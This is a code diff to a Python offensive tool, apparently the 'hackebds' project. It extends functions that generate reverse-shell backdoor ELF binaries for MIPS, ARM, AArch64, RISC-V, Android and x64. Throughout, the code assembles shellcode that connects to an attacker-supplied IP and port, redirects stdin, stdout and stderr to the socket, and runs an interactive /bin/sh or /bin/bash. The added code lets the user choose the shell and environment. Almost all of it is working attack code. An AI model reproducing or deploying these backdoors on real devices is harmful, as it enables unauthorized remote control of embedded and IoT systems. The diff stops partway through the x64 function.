@@ -6,6 +6,7 @@ from . import cve_info
 import os
 from hackebds.ESH import *
 from hackebds.powerpc_info import *
+from . import powerpc_info
 from colorama import Fore,Back,Style
 from . import sparc32
 from . import sparc64
@@ -13,15 +14,32 @@ from . import backdoor_encode
 from . import hackebds_cmd
 import string
 from . import my_package
+from . import power_reverse_shell
 
 chars = string.ascii_letters
 
-def mipsel_backdoor(reverse_ip,reverse_port,filename=None):
+def mipsel_backdoor(shell_path ,reverse_ip,reverse_port, envp ,filename=None):
 	context.arch='mips'
 	context.endian='little'
 	context.bits="32"
 	log.success("reverse_ip is set to "+ reverse_ip)
 	log.success("reverse_port is set to "+str(reverse_port))
+	shell_path_list = []
+	if shell_path == "/bin/bash" or shell_path == "bash":
+		shell_path = "/bin/bash"
+		shell_path_list.append(shell_path)
+		shell_path_list.append("-i")
+	elif shell_path == "/bin/sh" or shell_path == "sh":
+		shell_path = "/bin/sh"
+		shell_path_list.append(shell_path)
+		shell_path_list.append("-i")
+	else:
+		log.info("now shell is only support sh and bash")
+		return 
+	if(envp == None):
+		envp = 0
+	else:
+		envp = my_package.get_envir_args(envp)
 	shellcode_connect=asm(shellcraft.connect(reverse_ip,reverse_port))
 	shellcode_dump_sh='''
 	move $a0,$s0
@@ -40,7 +58,7 @@ def mipsel_backdoor(reverse_ip,reverse_port,filename=None):
 	syscall 0x40404
 	'''
 	shellcode_dump_sh=asm(shellcode_dump_sh)
-	shellcode_execve=asm(shellcraft.execve("/bin/sh",["/bin/sh"],0))
+	shellcode_execve=asm(shellcraft.execve(shell_path ,shell_path_list, envp))
 	ELF_data_shellcode=shellcode_connect+shellcode_dump_sh+shellcode_execve
 	ELF_data=make_elf(ELF_data_shellcode)
 	if filename==None:
@@ -88,12 +106,109 @@ def mipsel_backdoor(reverse_ip,reverse_port,filename=None):
 				return 
 
 
-def aarch64_backdoor(reverse_ip,reverse_port,filename=None):
+def aarch64_backdoor(shell_path ,reverse_ip,reverse_port, envp ,filename=None):
 	context.arch='aarch64'
 	context.endian='little'
 	context.bits="64"
 	log.success("reverse_ip is set to "+ reverse_ip)
 	log.success("reverse_port is set to "+str(reverse_port))
+	if shell_path == "/bin/bash" or shell_path == "bash":
+		shellcode3 = '''
+/* execve(path='/bin/bash', argv=['/bin/bash', '-i'], envp=0) */
+/* push b'/bin/bash\x00' */
+/* Set x14 = 8314034342958031407 = 0x7361622f6e69622f */
+mov  x14, #25135
+movk x14, #28265, lsl #16
+movk x14, #25135, lsl #0x20
+movk x14, #29537, lsl #0x30
+mov  x15, #104
+stp x14, x15, [sp, #-16]!
+mov  x0, sp
+/* push argument array [b'/bin/bash\x00', b'-i\x00'] */
+/* push b'/bin/bash\x00-i\x00' */
+/* Set x14 = 8314034342958031407 = 0x7361622f6e69622f */
+mov  x14, #25135
+movk x14, #28265, lsl #16
+movk x14, #25135, lsl #0x20
+movk x14, #29537, lsl #0x30
+/* Set x15 = 1764556904 = 0x692d0068 */
+mov  x15, #104
+movk x15, #26925, lsl #16
+stp x14, x15, [sp, #-16]!
+
+/* push null terminator */
+mov  x14, xzr
+str x14, [sp, #-8]!
+
+/* push pointers onto the stack */
+mov  x14, #18
+add x14, sp, x14
+sub sp, sp ,8
+str x14, [sp, #-8]!
+mov  x14, #24
+add x14, sp, x14
+sub sp, sp, 8
+stp x5, x14 , [sp, #-8]!
+
+add x1, sp, 8
+
+/* set x1 to the current top of the stack */
+mov  x2, xzr
+/* call execve() */
+mov  x8, #0xdd
+svc 0
+
+		'''
+	elif shell_path == "/bin/sh" or shell_path == "sh":
+		shellcode3 = '''
+mov  x14, #25135
+movk x14, #28265, lsl #16
+movk x14, #29487, lsl #0x20
+movk x14, #104, lsl #0x30
+str x14, [sp, #-16]!
+mov  x0, sp
+/* push argument array [b'/bin/sh\x00', b'-i\x00'] */
+/* push b'/bin/sh\x00-i\x00' */
+/* Set x14 = 29400045130965551 = 0x68732f6e69622f */
+mov  x14, #25135
+movk x14, #28265, lsl #16
+movk x14, #29487, lsl #0x20
+movk x14, #104, lsl #0x30
+mov  x15, #26925
+stp x14, x15, [sp, #-16]!
+
+/* push null terminator */
+mov  x14, xzr
+str x14, [sp, #-8]!
+
+/* push pointers onto the stack */
+mov  x14, #16
+add x14, sp, x14
+sub sp, sp, 8
+
+str x14, [sp, #-8]! /* b'/bin/sh\x00' */
+mov  x14, #24
+add x14, sp, x14
+sub sp, sp, 8
+str x14, [sp, #0]! /* b'-i\x00' */
+
+mov x1, sp
+
+/* set x1 to the current top of the stack */
+mov  x2, xzr
+/* call execve() */
+mov  x8, #0xdd
+svc 0
+
+
+		'''
+	else:
+		log.info("now shell is only support sh and bash")
+		return 
+	if(envp == None):
+		envp = 0
+	else:
+		envp = my_package.get_envir_args(envp)
 	basic_shellcode=asm(shellcraft.connect(reverse_ip,reverse_port))
 	shellcode2='''
 	mov x0,x12
@@ -109,7 +224,8 @@ def aarch64_backdoor(reverse_ip,reverse_port,filename=None):
 	svc #1337
 	'''
 	shellcode2=asm(shellcode2)
-	shellcode3=asm(shellcraft.execve("/bin/sh",["/bin/sh"]),0)
+	#shellcode3=asm(shellcraft.execve(shell_path, shell_path_list, envp))
+	shellcode3 = asm(shellcode3)
 	all_reverseshell=basic_shellcode+shellcode2+shellcode3
 	ELF_data=make_elf(all_reverseshell)
 	if filename==None:
@@ -249,12 +365,28 @@ def aarch64_reverse_sl(reverse_ip,reverse_port):
 		return shellcode
 
 
-def armelv7_backdoor(reverse_ip,reverse_port,filename=None):
+def armelv7_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 	context.arch='arm'
 	context.endian='little'
 	context.bits="32"
 	log.success("reverse_ip is set to "+ reverse_ip)
 	log.success("reverse_port is set to "+str(reverse_port))
+	shell_path_list = []
+	if shell_path == "/bin/bash" or shell_path == "bash":
+		shell_path = "/bin/bash"
+		shell_path_list.append(shell_path)
+		shell_path_list.append("-i")
+	elif shell_path == "/bin/sh" or shell_path == "sh":
+		shell_path = "/bin/sh"
+		shell_path_list.append(shell_path)
+		shell_path_list.append("-i")
+	else:
+		log.info("now shell is only support sh and bash")
+		return 
+	if(envp == None):
+		envp = 0
+	else:
+		envp = my_package.get_envir_args(envp)
 	basic_shellcode=asm(shellcraft.connect(reverse_ip,reverse_port))
 	shellcode2='''
 	mov r5,r6
@@ -270,7 +402,7 @@ def armelv7_backdoor(reverse_ip,reverse_port,filename=None):
 	svc #0
 	'''
 	shellcode2=asm(shellcode2)
-	shellcode3=asm(shellcraft.execve("/bin/sh",["/bin/sh"],0))
+	shellcode3=asm(shellcraft.execve(shell_path, shell_path_list, envp))
 	all_reverseshell=basic_shellcode+shellcode2+shellcode3
 	ELF_data=make_elf(all_reverseshell)
 	if filename==None:
@@ -430,11 +562,95 @@ def armelv7_reverse_sl(reverse_ip,reverse_port):
 
 
 
-def armelv5_backdoor(reverse_ip,reverse_port,filename=None):
+def armelv5_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 	context.bits="32"
 	context.arch='arm'
 	context.endian='little'
-	shellcode='''
+	shell_path_list = []
+	if shell_path == "/bin/bash" or shell_path == "bash":
+		shellcode='''
+	.ARM
+	eor r4,r4,r4
+	%s
+	strb r7,[sp,#-0x28]
+	%s
+	strb r7,[sp,#-0x27]
+	%s
+	strb r7,[sp,#-0x26]
+	%s
+	strb r7,[sp,#-0x25]
+	mov r7,#2
+	strb r7,[sp,#-0x2c]
+	strb r4,[sp,#-0x2b]
+	%s
+	strb r7,[sp,#-0x2a]
+	%s
+	strb r7,[sp,#-0x29]
+	strb r4,[sp,#-0x14]
+	mov r7,#0x68
+	strb r7,[sp,#-0x15]
+	mov r7,#0x73
+	strb r7,[sp,#-0x16]
+	mov r7,#0x61
+	strb r7,[sp,#-0x17]
+	mov r7,#0x62
+	strb r7,[sp,#-0x18]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x19]
+	mov r7,#0x6e
+	strb r7,[sp,#-0x1a]
+	mov r7,#0x69
+	strb r7,[sp,#-0x1b]
+	mov r7,#0x62
+	strb r7,[sp,#-0x1c]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x1d]
+	eor r7, r7
+	strb r7,[sp,#-0x1e]
+	mov r7,#0x69
+	strb r7,[sp,#-0x1f]
+	mov r7,#0x2d
+	strb r7,[sp,#-0x20]
+	add r4,sp,#-0x1d
+	add r5,sp,#-0x2c
+	add r8,sp,#-0x20
+	add r3,pc,#1
+	bx  r3
+	.THUMB
+	mov r1,#2
+	mov r0,r1
+	mov r1,#1
+	eor r2,r2,r2
+	mov r7,#200
+	add r7,r7,#81
+	svc #1
+	mov r6,r0
+	mov r1,r5
+	mov r2,#0x10
+	add r7,r7,#2
+	svc #1
+	mov r0,r6
+	eor r1,r1,r1
+	mov r7,#63
+	svc #1
+	mov r0,r6
+	add r1,r1,#1
+	svc #1
+	mov r0,r6
+	add r1,r1,#1
+	svc #1
+	mov r0,r4
+	eor r1,r1,r1
+	eor r2,r2,r2
+	push {r1}
+	push {r0,r8}
+	mov r1,sp
+	mov r7,#0xb
+	svc #1
+
+	'''
+	elif shell_path == "/bin/sh" or shell_path == "sh":
+		shellcode='''
 	.ARM
 	eor r4,r4,r4
 	%s
@@ -467,8 +683,13 @@ def armelv5_backdoor(reverse_ip,reverse_port,filename=None):
 	strb r7,[sp,#-0x1a]
 	mov r7,#0x2f
 	strb r7,[sp,#-0x1b]
+	mov r7,#0x69
+	strb r7,[sp,#-0x1f]
+	mov r7,#0x2d
+	strb r7,[sp,#-0x20]
 	add r4,sp,#-0x1b
 	add r5,sp,#-0x2c
+	add r8,sp,#-0x20
 	add r3,pc,#1
 	bx  r3
 	.THUMB
@@ -497,11 +718,20 @@ def armelv5_backdoor(reverse_ip,reverse_port,filename=None):
 	mov r0,r4
 	eor r1,r1,r1
 	eor r2,r2,r2
-	push {r0,r1}
+	push {r1}
+	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
 	svc #1
+
 	'''
+	else:
+		log.info("now shell is only support sh and bash")
+		return 
+	if(envp == None):
+		envp = 0
+	else:
+		envp = my_package.get_envir_args(envp)
 	log.success("reverse_ip is set to "+ reverse_ip)
 	log.success("reverse_port is set to "+str(reverse_port))
 	handle_ip=reverse_ip.split('.')
@@ -908,11 +1138,27 @@ def armebv5_reverse_sl(reverse_ip,reverse_port):
 		context.endian="little"
 		return shellcode
 
-def armebv7_backdoor(reverse_ip,reverse_port,filename=None):
+def armebv7_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 	context.bits="32"
 	context.arch='arm'
 	context.endian='big'
 	basic_shellcode=asm(shellcraft.connect(reverse_ip,reverse_port))
+	shell_path_list = []
+	if shell_path == "/bin/bash" or shell_path == "bash":
+		shell_path = "/bin/bash"
+		shell_path_list.append(shell_path)
+		shell_path_list.append("-i")
+	elif shell_path == "/bin/sh" or shell_path == "sh":
+		shell_path = "/bin/sh"
+		shell_path_list.append(shell_path)
+		shell_path_list.append("-i")
+	else:
+		log.info("now shell is only support sh and bash")
+		return 
+	if(envp == None):
+		envp = 0
+	else:
+		envp = my_package.get_envir_args(envp)
 	shellcode2='''
 	mov r5,r6
 	mov r0,r5
@@ -929,7 +1175,7 @@ def armebv7_backdoor(reverse_ip,reverse_port,filename=None):
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
 	shellcode2=asm(shellcode2)
-	shellcode3=asm(shellcraft.sh())
+	shellcode3=asm(shellcraft.execve(shell_path, shell_path_list, envp))
 	all_reverseshell=basic_shellcode+shellcode2+shellcode3
 	ELF_data =make_elf(all_reverseshell)
 	if filename==None:
@@ -973,11 +1219,93 @@ def armebv7_backdoor(reverse_ip,reverse_port,filename=None):
 			else:
 				return 
 
-def armebv5_backdoor(reverse_ip,reverse_port,filename=None):
+def armebv5_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 	context.bits="32"
 	context.arch='arm'
 	context.endian='big'
-	shellcode='''
+	if shell_path == "/bin/bash" or shell_path == "bash":
+		shellcode='''
+	.ARM
+	eor r4,r4,r4
+	%s
+	strb r7,[sp,#-0x28]
+	%s
+	strb r7,[sp,#-0x27]
+	%s
+	strb r7,[sp,#-0x26]
+	%s
+	strb r7,[sp,#-0x25]
+	mov r7,#2
+	strb r7,[sp,#-0x2b]
+	strb r4,[sp,#-0x2c]
+	%s
+	strb r7,[sp,#-0x2a]
+	%s
+	strb r7,[sp,#-0x29]
+	strb r4,[sp,#-0x14]
+	mov r7,#0x68
+	strb r7,[sp,#-0x15]
+	mov r7,#0x73
+	strb r7,[sp,#-0x16]
+	mov r7,#0x61
+	strb r7,[sp,#-0x17]
+	mov r7,#0x62
+	strb r7,[sp,#-0x18]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x19]
+	mov r7,#0x6e
+	strb r7,[sp,#-0x1a]
+	mov r7,#0x69
+	strb r7,[sp,#-0x1b]
+	mov r7,#0x62
+	strb r7,[sp,#-0x1c]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x1d]
+	eor r7, r7
+	strb r7,[sp,#-0x1e]
+	mov r7,#0x69
+	strb r7,[sp,#-0x1f]
+	mov r7,#0x2d
+	strb r7,[sp,#-0x20]
+	add r4,sp,#-0x1d
+	add r8,sp,#-0x20
+	add r5,sp,#-0x2c
+	add r3,pc,#1
+	bx  r3
+	.THUMB
+	mov r1,#2
+	mov r0,r1
+	mov r1,#1
+	eor r2,r2,r2
+	mov r7,#200
+	add r7,r7,#81
+	svc #1
+	mov r6,r0
+	mov r1,r5
+	mov r2,#0x10
+	add r7,r7,#2
+	svc #1
+	mov r0,r6
+	eor r1,r1,r1
+	mov r7,#63
+	svc #1
+	mov r0,r6
+	add r1,r1,#1
+	svc #1
+	mov r0,r6
+	add r1,r1,#1
+	svc #1
+	mov r0,r4
+	eor r1,r1,r1
+	eor r2,r2,r2
+	push {r1}
+	push {r0,r8}
+	mov r1,sp
+	mov r7,#0xb
+	svc #1
+	'''
+	elif shell_path == "/bin/sh" or shell_path == "sh":
+		shellcode = '''
 	.ARM
 	eor r4,r4,r4
 	%s
@@ -1010,6 +1338,13 @@ def armebv5_backdoor(reverse_ip,reverse_port,filename=None):
 	strb r7,[sp,#-0x1a]
 	mov r7,#0x2f
 	strb r7,[sp,#-0x1b]
+	eor r7, r7
+	strb r7,[sp,#-0x1e]
+	mov r7,#0x69
+	strb r7,[sp,#-0x1f]
+	mov r7,#0x2d
+	strb r7,[sp,#-0x20]
+	add r8,sp,#-0x20
 	add r4,sp,#-0x1b
 	add r5,sp,#-0x2c
 	add r3,pc,#1
@@ -1040,11 +1375,19 @@ def armebv5_backdoor(reverse_ip,reverse_port,filename=None):
 	mov r0,r4
 	eor r1,r1,r1
 	eor r2,r2,r2
-	push {r0,r1}
+	push {r1}
+	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
 	svc #1
 	'''
+	else:
+		log.info("now shell is only support sh and bash")
+		return 
+	if(envp == None):
+		envp = 0
+	else:
+		envp = my_package.get_envir_args(envp)
 	log.success("reverse_ip is set to "+ reverse_ip)
 	log.success("reverse_port is set to "+str(reverse_port))
 	handle_ip=reverse_ip.split('.')
@@ -1108,10 +1451,26 @@ def armebv5_backdoor(reverse_ip,reverse_port,filename=None):
 				return 
 
 
-def mips_backdoor(reverse_ip,reverse_port,filename=None):
+def mips_backdoor(shell_path ,reverse_ip,reverse_port, envp ,filename=None):
 	context.arch='mips'
 	context.endian='big'
 	context.bits="32"
+	shell_path_list = []
+	if shell_path == "/bin/bash" or shell_path == "bash":
+		shell_path = "/bin/bash"
+		shell_path_list.append(shell_path)
+		shell_path_list.append("-i")
+	elif shell_path == "/bin/sh" or shell_path == "sh":
+		shell_path = "/bin/sh"
+		shell_path_list.append(shell_path)
+		shell_path_list.append("-i")
+	else:
+		log.info("now shell is only support sh and bash")
+		return 
+	if(envp == None):
+		envp = 0
+	else:
+		envp = my_package.get_envir_args(envp)
 	shellcode_connect=asm(shellcraft.connect(reverse_ip,reverse_port))
 	shellcode_dump_sh='''
 	nor $a1,$zero,-1
@@ -1126,7 +1485,7 @@ def mips_backdoor(reverse_ip,reverse_port,filename=None):
 	li  $v0,0xfdf
 	syscall 0x40404
 	'''
-	shellcode_execve = shellcraft.execve("/bin/sh",["/bin/sh"],0)
+	shellcode_execve = shellcraft.execve(shell_path,shell_path_list, envp)
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
 	#all_shellcode = shellcraft.connect(reverse_ip,reverse_port) + shellcode_dump_sh + shellcode_execve
@@ -1272,7 +1631,7 @@ def mips_reverse_sl(reverse_ip,reverse_port):
 		context.endian="little"
 		return data_shellcode
 
-def mips64el_backdoor(reverse_ip,reverse_port,filename=None):
+def mips64el_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 	'''
 	socket number v0=0x13b0
 	connect number v0=0x13b1
@@ -1342,39 +1701,95 @@ def mips64el_backdoor(reverse_ip,reverse_port,filename=None):
 	li  $v0,0x13A8
 	syscall 0x40404
 	'''
-	shellcode_execve='''
-	lui     $t1, 0x6e69
-	ori     $t1, $t1, 0x622f
-	sw      $t1, -8($sp)
-	lui     $t9, 0xff97
-	ori     $t9, $t9, 0x8cd0
-	nor     $t1, $t9, $zero
-	sw      $t1, -4($sp)
-	daddiu   $sp, $sp, -8
-	dadd     $a0, $sp, $zero
-	lui     $t1, 0x6e69
-	ori     $t1, $t1, 0x622f
-	sw      $t1,-12($sp)
-	lui     $t9, 0xff97
-	ori     $t9, $t9, 0x8cd0
-	nor     $t1, $t9, $zero
-	sw      $t1, -8($sp)
-	sw      $zero, -4($sp)
-	daddiu   $sp, $sp, -12
-	slti    $a1, $zero, -1
-	sd      $a1, -8($sp)
-	daddi    $sp, $sp, -8
-	li      $t9, -9
-	nor     $a1, $t9, $zero
-	dadd     $a1, $sp, $a1
-	sd      $a1, -8($sp)
-	daddi    $sp, $sp, -8
-	dadd     $a1, $sp, $zero
-	slti    $a2, $zero, -1
-	li      $v0, 0x13c1
-	syscall 0x40404
+	if shell_path == "/bin/sh" or shell_path=="sh":
+		shellcode_execve='''
+		li $t1, 0x6e69622f
+		sw $t1, -8($sp)
+		li $t9, ~0x68732f
+		not $t1, $t9
+		sw $t1, -4($sp)
+		daddiu $sp, $sp, -8
+		daddiu $a0, $sp, 0 /* mov $a0, $sp */
+		/* push argument array ['/bin/sh\x00', '-i\x00'] */
+		/* push '/bin/sh\x00-i\x00\x00' */
+		li $t1, 0x6e69622f
+		sw $t1, -12($sp)
+		li $t9, ~0x68732f
+		not $t1, $t9
+		sw $t1, -8($sp)
+		ori $t1, $zero, 26925
+		sw $t1, -4($sp)
+		daddiu $sp, $sp, -12
+		slti $a1, $zero, 0xFFFF /* $a1 = 0 */
+		sd $a1, -8($sp)
+		daddiu $sp, $sp, -8 /* null terminate */
+		li $t9, ~0xc
+		not $a1, $t9
+		dadd $a1, $sp, $a1
+		dadd $a1, $a1, 4
+		sd $a1, -8($sp)
+		daddi $sp, $sp, -8 /* '-i\x00' */
+		li $t9, ~16
+		not $a1, $t9
+		dadd $a1, $sp, $a1
+		sd $a1, -8($sp)
+		daddiu $sp, $sp, -8 /* '/bin/sh\x00' */
+		daddiu $a1, $sp, 0 /* mov $a1, $sp */
+		slti $a2, $zero, 0xFFFF /* $a2 = 0 */
+		/* call execve() */
+		li $v0,0x13c1
+		syscall 0x40404
 
-	'''
+		'''
+	elif shell_path == "/bin/bash" or shell_path == "bash":
+		shellcode_execve = '''
+		li $t1, 0x6e69622f
+		sw $t1, -12($sp)
+		li $t1, 0x7361622f
+		sw $t1, -8($sp)
+		li $t9, ~0x68
+		not $t1, $t9
+		sw $t1, -4($sp)
+		daddiu $sp, $sp, -12
+		daddiu $a0, $sp, 0 /* mov $a0, $sp */
+		/* push argument array ['/bin/bash\x00', '-i\x00'] */
+		/* push '/bin/bash\x00-i\x00\x00' */
+		li $t1, 0x6e69622f
+		sw $t1, -16($sp)
+		li $t1, 0x7361622f
+		sw $t1, -12($sp)
+		li $t9, ~0x692d0068
+		not $t1, $t9
+		sw $t1, -8($sp)
+		sw $zero, -4($sp)
+		daddiu $sp, $sp, -12
+		slti $a1, $zero, 0xFFFF /* $a1 = 0 */
+		sd $a1, -8($sp)
+		daddiu $sp, $sp, -8 /* null terminate */
+		li $t9, ~0xe
+		not $a1, $t9
+		dadd $a1, $sp, $a1
+		sd $a1, -8($sp)
+		daddiu $sp, $sp, -8 /* '-i\x00' */
+		li $t9, ~16
+		not $a1, $t9
+		dadd $a1, $sp, $a1
+		sd $a1, -8($sp)
+		daddi $sp, $sp, -8 /* '/bin/bash\x00' */
+		dadd $a1, $sp, $0 /* mov $a1, $sp */
+		slti $a2, $zero, 0xFFFF /* $a2 = 0 */
+		/* call execve() */
+		li $v0,0x13c1
+		syscall 0x40404
+
+		'''
+	else:
+		log.info("now shell is only support sh and bash")
+		return 
+	if(envp == None):
+		envp = 0
+	else:
+		envp = my_package.get_envir_args(envp)
 	shellcode=asm(shellcode_connect)+asm(shellcode_dup_sh)+asm(shellcode_execve)
 	ELF_data =make_elf(shellcode)
 	if(filename==None):
@@ -1418,7 +1833,7 @@ def mips64el_backdoor(reverse_ip,reverse_port,filename=None):
 			else:
 				return 
 
-def mips64_backdoor(reverse_ip,reverse_port,filename=None):
+def mips64_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 	context.arch='mips64'
 	context.bits="64"
 	context.endian='big'
@@ -1476,38 +1891,97 @@ def mips64_backdoor(reverse_ip,reverse_port,filename=None):
 	li  $v0,0x13A8
 	syscall 0x40404
 	'''
-	shellcode_execve='''
-	lui     $t1, 0x2f62
-	ori     $t1, $t1, 0x696e
-	sw      $t1, -8($sp)
-	lui     $t9, 0xd08c
-	ori     $t9, $t9, 0x97ff
-	nor     $t1, $t9, $zero
-	sw      $t1, -4($sp)
-	daddiu   $sp, $sp, -8
-	dadd     $a0, $sp, $zero
-	lui     $t1, 0x2f62
-	ori     $t1, $t1, 0x696e
-	sw      $t1, -12($sp)
-	lui     $t9, 0xd08c
-	ori     $t9, $t9, 0x97ff
-	nor     $t1, $t9, $zero
-	sw      $t1, -8($sp)
-	sw      $zero, -4($sp)
-	daddiu   $sp, $sp, -12
-	slti    $a1, $zero, -1
-	sd      $a1, -8($sp)
-	daddi    $sp, $sp, -8
-	li      $t9, -9
-	nor     $a1, $t9, $zero
-	dadd     $a1, $sp, $a1
-	sd      $a1, -8($sp)
-	daddi    $sp, $sp, -8
-	dadd     $a1, $sp, $zero
-	slti    $a2, $zero, -1
-	li      $v0,0x13c1
-	syscall 0x40404
-	'''
+	if shell_path == "/bin/sh" or shell_path == "sh":
+		shellcode_execve='''
+		li $t1, 0x2f62696e
+		sw $t1, -8($sp)
+		li $t9, ~0x2f736800
+		not $t1, $t9
+		sw $t1, -4($sp)
+		daddiu $sp, $sp, -8
+		daddiu $a0, $sp, 0 /* mov $a0, $sp */
+		/* push argument array ['/bin/sh\x00', '-i\x00'] */
+		/* push '/bin/sh\x00-i\x00\x00' */
+		li $t1, 0x2f62696e
+		sw $t1, -12($sp)
+		li $t9, ~0x2f736800
+		not $t1, $t9
+		sw $t1, -8($sp)
+		li $t9, ~0x2d690000
+		not $t1, $t9
+		sw $t1, -4($sp)
+		daddiu $sp, $sp, -12
+		slti $a1, $zero, 0xFFFF /* $a1 = 0 */
+		sd $a1, -8($sp)
+		daddiu $sp, $sp, -8 /* null terminate */
+		li $t9, ~0xc
+		not $a1, $t9
+		dadd $a1, $sp, $a1
+		dadd $a1, $a1, 4
+		sd $a1, -8($sp)
+		daddi $sp, $sp, -8 /* '-i\x00' */
+		li $t9, ~16
+		not $a1, $t9
+		dadd $a1, $sp, $a1
+		sd $a1, -8($sp)
+		daddiu $sp, $sp, -8 /* '/bin/sh\x00' */
+		daddiu $a1, $sp, 0 /* mov $a1, $sp */
+		slti $a2, $zero, 0xFFFF /* $a2 = 0 */
+		/* call execve() */
+		li $v0,0x13c1
+		syscall 0x40404
+
+		'''
+	elif shell_path == "/bin/bash" or shell_path == "bash":
+		shellcode_execve = '''
+		li $t1, 0x2f62696e
+		sw $t1, -12($sp)
+		li $t1, 0x2f626173
+		sw $t1, -8($sp)
+		li $t9, ~0x68000000
+		not $t1, $t9
+		sw $t1, -4($sp)
+		daddiu $sp, $sp, -12
+		daddiu $a0, $sp, 0 /* mov $a0, $sp */
+		/* push argument array ['/bin/bash\x00', '-i\x00'] */
+		/* push '/bin/bash\x00-i\x00\x00' */
+		li $t1, 0x2f62696e
+		sw $t1, -16($sp)
+		li $t1, 0x2f626173
+		sw $t1, -12($sp)
+		li $t9, ~0x68002d69
+		not $t1, $t9
+		sw $t1, -8($sp)
+		sw $zero, -4($sp)
+		daddiu $sp, $sp, -12
+		slti $a1, $zero, 0xFFFF /* $a1 = 0 */
+		sd $a1, -8($sp)
+		daddiu $sp, $sp, -8 /* null terminate */
+		li $t9, ~0xe
+		not $a1, $t9
+		dadd $a1, $sp, $a1
+		sd $a1, -8($sp)
+		daddiu $sp, $sp, -8 /* '-i\x00' */
+		li $t9, ~16
+		not $a1, $t9
+		dadd $a1, $sp, $a1
+		sd $a1, -8($sp)
+		daddi $sp, $sp, -8 /* '/bin/bash\x00' */
+		dadd $a1, $sp, $0 /* mov $a1, $sp */
+		slti $a2, $zero, 0xFFFF /* $a2 = 0 */
+		/* call execve() */
+		li $v0,0x13c1
+		syscall 0x40404
+
+		'''
+	else:
+		log.info("now shell is only support sh and bash")
+		return 
+	if(envp == None):
+		envp = 0
+	else:
+		envp = my_package.get_envir_args(envp)
+		
 	shellcode = asm(shellcode_connect) + asm(shellcode_dup_sh) + asm(shellcode_execve)
 	ELF_data = make_elf(shellcode)
 	if (filename == None):
@@ -1777,7 +2251,7 @@ def mips64_reverse_sl(reverse_ip,reverse_port):
 		context.endian = "little"
 		return data_shellcode
 		
-def riscv64el_backdoor(reverse_ip,reverse_port,filename=None):
+def riscv64el_backdoor(shell_path ,reverse_ip,reverse_port, envp ,filename=None):
 	'''
 	socket 0xc6
 	connect 0xcb
@@ -1824,17 +2298,49 @@ def riscv64el_backdoor(reverse_ip,reverse_port,filename=None):
 	ecall
 	'''
 	shellcode_dup_sh=asm(shellcode_dup_sh)
-	shellcode_execve='''
-	li s1, 0x68732f2f6e69622f
-	sd s1, -16(sp)
-	sd zero, -8(sp)
-	addi a0,sp,-16
-	sd a0, -32(sp)
-	addi a1,sp,-32
-	slt a2,zero,-1 
-	li a7, 221
-	ecall
-	'''
+	if shell_path == "/bin/sh" or shell_path == "sh":
+		shellcode_execve='''
+		li s1, 0x68732f2f6e69622f
+		sd s1, -48(sp)
+		li s1, 0x692d
+		sd s1, -64(sp)
+		addi a0,sp,-48
+		sd a0, -16(sp)
+		addi a5,sp,-64
+		sd a5, -8(sp)
+		sd zero, 0(sp)
+		addi a1,sp,-16
+		slt a2,zero,-1 
+		li a7, 221
+		ecall
+		'''
+	elif shell_path == "/bin/bash" or shell_path == "bash":
+		shellcode_execve = '''
+		li s1, 0x687361622f6e6962
+		sd s1, -16(sp)
+		li s1, 0x2f00000000000000
+		sd s1, -24(sp)
+		li s1, 0x692d
+		sd s1, -32(sp)
+		sd zero, -8(sp)
+		addi a0,sp,-17
+		sd a0, -64(sp)
+		addi a5,sp,-32
+		sd a5, -56(sp)
+		add a1,sp,-64
+		sd zero,-48(sp)
+		slt a2,zero,-1
+		li a7, 221
+		ecall
+		'''
+
+	else:
+		log.info("now shell is only support sh and bash")
+		return 
+	if(envp == None):
+		envp = 0
+	else:
+		envp = my_package.get_envir_args(envp)
 	shellcode_execve=asm(shellcode_execve)
 	shellcode = shellcode_connect+shellcode_dup_sh+shellcode_execve
 	ELF_data =make_elf(shellcode)
@@ -1879,12 +2385,28 @@ def riscv64el_backdoor(reverse_ip,reverse_port,filename=None):
 			else:
 				return 
 
-def android_aarch64_backdoor(reverse_ip,reverse_port,filename=None):
+def android_aarch64_backdoor(shell_path ,reverse_ip,reverse_port, envp ,filename=None):
 	context.arch='aarch64'
 	context.endian='little'
 	context.bits="64"
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
+	shell_path_list = []
+	if shell_path == "/bin/bash" or shell_path == "bash":
+		shell_path = "/system/bin/bash"
+		shell_path_list.append(shell_path)
+		shell_path_list.append("-i")
+	elif shell_path == "/bin/sh" or shell_path == "sh":
+		shell_path = "/system/bin/sh"
+		shell_path_list.append(shell_path)
+		shell_path_list.append("-i")
+	else:
+		log.info("now shell is only support sh and bash")
+		return 
+	if(envp == None):
+		envp = 0
+	else:
+		envp = my_package.get_envir_args(envp)
 	basic_shellcode=asm(shellcraft.connect(reverse_ip,reverse_port))
 	shellcode2='''
 	mov x0,x12
@@ -1900,7 +2422,7 @@ def android_aarch64_backdoor(reverse_ip,reverse_port,filename=None):
 	svc #1337
 	'''
 	shellcode2=asm(shellcode2)
-	shellcode3=asm(shellcraft.execve("/system/bin/sh",0,0))
+	shellcode3=asm(shellcraft.execve(shell_path, shell_path_list, envp))
 	all_reverseshell=basic_shellcode+shellcode2+shellcode3
 	#all_reverseshell=shellcode3
 	ELF_data = make_elf(all_reverseshell)
@@ -2475,15 +2997,31 @@ def armv7eb_bind_shell(listen_port, passwd, filename = None):
 x86 x64el_backdoor
 2022.10.31 add
 '''
-def x64el_backdoor(reverse_ip, reverse_port, filename=None):
+def x64el_backdoor(shell_path ,reverse_ip, reverse_port, envp ,filename=None):
 	context.arch = 'amd64'
 	context.endian = 'little'
 	context.bits = '64'
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
